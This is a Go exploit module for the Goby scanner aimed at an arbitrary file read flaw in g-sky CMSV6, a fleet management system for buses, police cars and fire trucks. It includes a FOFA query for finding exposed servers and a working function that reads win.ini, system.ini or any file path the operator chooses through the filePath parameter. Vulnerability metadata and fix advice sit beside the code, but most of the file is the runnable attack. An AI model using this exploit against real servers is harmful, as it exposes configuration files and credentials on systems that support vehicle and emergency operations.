package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "g-sky cmsv6  /808gps/StandardReportMediaAction_getImage.action file filePath parameter File Read Vulnerability",
    "Description": "<p>The Tongtianxing CMSV6 is widely used in commercial vehicles such as buses, taxis, logistics vehicles, as well as special vehicles such as police cars and fire trucks, to improve vehicle safety and management efficiency, help users understand vehicle operation, and provide effective evidence to support accident investigation and dispute resolution. </p><p>Due to an arbitrary file read vulnerability in the filePath parameter of the StandardReportMediaAction_getImage.action file in the CMSV6 of Tongtianxing, attackers can exploit this vulnerability to read configuration files within the server</p>",
    "Product": "g-sky cmsv6",
    "Homepage": "http://www.g-sky.cn/",
    "DisclosureDate": "2024-05-17",
    "PostTime": "2024-05-17",
    "Author": "15900373599@163.com",
    "FofaQuery": "body=\"808gps/js\" || body=\"808gps/image\"",
    "GobyQuery": "body=\"808gps/js\" || body=\"808gps/image\"",
    "Level": "2",
    "Impact": "<p>Due to an arbitrary file read vulnerability in the filePath parameter of the StandardReportMediaAction_getImage.action file in the CMSV6 of Tongtianxing, attackers can exploit this vulnerability to read configuration files within the server</p>",
    "Recommendation": "<p>Filter the path parameter by sequentially filtering characters such as \".\", \"..\", \"/\", \"\\\", etc. Alternatively, restrictions can be placed on the directory where files can be downloaded, allowing only files from the specified directory to be downloaded. Alternatively, the path of the resource file to be downloaded can be saved to the database, and when downloading attachments, the ID in the database can be specified, which is the corresponding resource.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "win.ini,system.ini,custom",
            "show": ""
        },
        {
            "name": "custom",
            "type": "textarea",
            "value": "",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=0&fileSize=1000",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
                    "Connection": "close",
                    "Content-Length": "0",
                    "Accept-Encoding": "gzip"
                },
                "data_type": "text",
                "data": "\n\n"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[fonts]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulUrl|lastbody|variable|{{{fixedhostinfo}}}/808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=0&fileSize=1000"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "通天星 CMSV6 /808gps/StandardReportMediaAction_getImage.action 文件 filePath 参数 文件读取漏洞",
            "Product": "通天星cmsv6",
            "Description": "<p>通天星CMSV6广泛应用于公交车、出租车、物流车等商用车辆，以及警车、消防车等特种车辆，提高车辆安全性和管理效率，帮助用户了解车辆运行情况，提供有效证据支持事故调查和纠纷解决。<br></p><p>由于通天星CMSV6的StandardReportMediaAction_getImage.action文件的filePath参数存在任意文件读取漏洞,攻击者利用此漏洞可以读取服务器内配置文件</p>",
            "Recommendation": "<p>对path参数进行过滤，依次过滤“.”、“..”、“/”、“\\”等字符。或者对于下载文件的目录做好限制，只能下载指定目录下的文件，或者将要下载的资源文件路径存入数据库，附件下载时指定数据库中的id即可，id即对应的资源。<br></p>",
            "Impact": "<p>由于通天星CMSV6的StandardReportMediaAction_getImage.action文件的filePath参数存在任意文件读取漏洞,攻击者利用此漏洞可以读取服务器内配置文件<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "g-sky cmsv6  /808gps/StandardReportMediaAction_getImage.action file filePath parameter File Read Vulnerability",
            "Product": "g-sky cmsv6",
            "Description": "<p>The Tongtianxing CMSV6 is widely used in commercial vehicles such as buses, taxis, logistics vehicles, as well as special vehicles such as police cars and fire trucks, to improve vehicle safety and management efficiency, help users understand vehicle operation, and provide effective evidence to support accident investigation and dispute resolution.&nbsp;</p><p>Due to an arbitrary file read vulnerability in the filePath parameter of the StandardReportMediaAction_getImage.action file in the CMSV6 of Tongtianxing, attackers can exploit this vulnerability to read configuration files within the server<br></p>",
            "Recommendation": "<p>Filter the path parameter by sequentially filtering characters such as \".\", \"..\", \"/\", \"\\\", etc. Alternatively, restrictions can be placed on the directory where files can be downloaded, allowing only files from the specified directory to be downloaded. Alternatively, the path of the resource file to be downloaded can be saved to the database, and when downloading attachments, the ID in the database can be specified, which is the corresponding resource.<br></p>",
            "Impact": "<p>Due to an arbitrary file read vulnerability in the filePath parameter of the StandardReportMediaAction_getImage.action file in the CMSV6 of Tongtianxing, attackers can exploit this vulnerability to read configuration files within the server<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10953"
}`

	fileReadXcsxawdw := func(hostInfo *httpclient.FixUrl, fileReadPayload string) string {
		content := ""
		vulUrl := "/808gps/StandardReportMediaAction_getImage.action?filePath=" + fileReadPayload + "&fileOffset=0&fileSize=300"
		httpConfig := httpclient.NewPostRequestConfig(vulUrl)
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		httpConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
		httpConfig.Header.Store("Connection", "close")
		httpConfig.Header.Store("Accept-Encoding", "gzip")
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return ""
		}
		if resp.StatusCode == 200 {
			if strings.Contains(resp.Utf8Html, "\"result\":1") {
				return ""
			}
			content = resp.Utf8Html
		}

		return content
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			custom := ss.Params["custom"].(string)
			var msg string
			var fileReadPayload string
			if attackType == "win.ini" {
				fileReadPayload = "C://Windows//win.ini"
				msg = fileReadXcsxawdw(expResult.HostInfo, fileReadPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}
			} else if attackType == "system.ini" {
				fileReadPayload = "C://Windows//system.ini"
				msg = fileReadXcsxawdw(expResult.HostInfo, fileReadPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}

			} else if attackType == "custom" {
				fileReadPayload = custom
				msg = fileReadXcsxawdw(expResult.HostInfo, fileReadPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}
			} else {
				expResult.Output = "未知的攻击方式！"
			}
			expResult.Success = true
			expResult.Output = fileReadPayload + ":" + msg
			return expResult
		},
	))
}
